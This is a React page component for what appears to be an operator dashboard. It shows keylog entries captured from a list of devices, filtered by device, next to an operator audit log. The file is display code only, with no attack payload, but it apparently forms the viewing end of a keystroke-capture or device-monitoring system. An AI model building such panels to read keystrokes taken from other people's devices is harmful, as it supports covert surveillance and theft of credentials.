import { useState, useEffect } from 'react';
import { useStore } from '../lib/store.js';
import { useAPI } from '../hooks/useAPI.js';
import { getDevices, getAuditLogs } from '../lib/api.js';
import KeylogViewer from '../components/KeylogViewer.jsx';

export default function Logs() {
  const [activeTab, setActiveTab] = useState('keylogs');
  const [selectedDeviceId, setSelectedDeviceId] = useState('');
  const [devices, setDevices] = useState([]);

  // Load devices for filter
  useEffect(() => {
    getDevices().then(data => setDevices(data.devices || [])).catch(() => {});
  }, []);

  // Keylogs
  const keylogs = useStore(s => s.keylogs);

  // Audit logs
  const { data: auditData, loading: auditLoading } = useAPI(
    () => getAuditLogs({ limit: 200 }),
    10000
  );
  const auditLogs = auditData?.logs || [];

  const tabs = [
    { id: 'keylogs', label: 'Keylogs' },
    { id: 'audit', label: 'Audit Log' },
  ];

  return (
    <div className="space-y-6 animate-slide-in">
      <div>
        <h1 className="text-lg font-semibold text-gray-100">Logs</h1>
        <p className="text-xs text-surface-400 mt-0.5">Keylog entries and operator audit trail</p>
      </div>

      {/* Tabs */}
      <div className="flex items-center gap-1 bg-surface-900 border border-surface-800 rounded-lg p-1 w-fit">
        {tabs.map(tab => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            className={`px-4 py-1.5 text-xs rounded transition-colors ${
              activeTab === tab.id
                ? 'bg-accent text-white'
                : 'text-surface-400 hover:text-gray-200'
            }`}
          >
            {tab.label}
          </button>
        ))}
      </div>

      {/* Tab content */}
      {activeTab === 'keylogs' && (
        <div className="space-y-3">
          {/* Device filter */}
          <div className="flex items-center gap-2">
            <select
              value={selectedDeviceId}
              onChange={e => setSelectedDeviceId(e.target.value)}
              className="h-8 px-2 text-xs bg-surface-800 border border-surface-700 rounded text-gray-200 outline-none focus:border-accent/50"
            >
              <option value="">All devices</option>
              {devices.map(d => (
                <option key={d.id} value={d.id}>
                  {d.name || d.model || d.id?.slice(0, 8)}
                </option>
              ))}
            </select>
            <span className="text-xs text-surface-500">
              {keylogs.length} entries
            </span>
          </div>

          <div className="bg-surface-900 border border-surface-800 rounded-lg p-4">
            <KeylogViewer
              keylogs={
                selectedDeviceId
                  ? keylogs.filter(k => k.device_id === selectedDeviceId)
                  : keylogs
              }
            />
          </div>
        </div>
      )}

      {activeTab === 'audit' && (
        <div className="bg-surface-900 border border-surface-800 rounded-lg">
          {auditLoading ? (
            <div className="flex items-center justify-center py-8">
              <div className="w-5 h-5 border-2 border-accent border-t-transparent rounded-full animate-spin" />
            </div>
          ) : auditLogs.length === 0 ? (
            <p className="text-xs text-surface-500 text-center py-8">No audit entries</p>
          ) : (
            <div className="max-h-[600px] overflow-y-auto">
              <table className="w-full text-xs">
                <thead>
                  <tr className="border-b border-surface-800 text-surface-500 font-mono uppercase tracking-wider">
                    <th className="text-left px-4 py-2 font-normal">Time</th>
                    <th className="text-left px-4 py-2 font-normal">User</th>
                    <th className="text-left px-4 py-2 font-normal">Action</th>
                    <th className="text-left px-4 py-2 font-normal">Target</th>
                    <th className="text-left px-4 py-2 font-normal">IP</th>
                  </tr>
                </thead>
                <tbody>
                  {auditLogs.map(log => (
                    <tr key={log.id} className="border-b border-surface-800 last:border-0 hover:bg-surface-800/30">
                      <td className="px-4 py-2 text-surface-400 whitespace-nowrap font-mono">
                        {new Date(log.created_at).toLocaleString()}
                      </td>
                      <td className="px-4 py-2 text-gray-300">{log.user_id?.slice(0, 8) || 'system'}</td>
                      <td className="px-4 py-2">
                        <span className="text-accent">{log.action}</span>
                      </td>
                      <td className="px-4 py-2 text-gray-400">
                        {log.target_type} {log.target_id?.slice(0, 8) || ''}
                      </td>
                      <td className="px-4 py-2 text-surface-400 font-mono">{log.ip || '—'}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
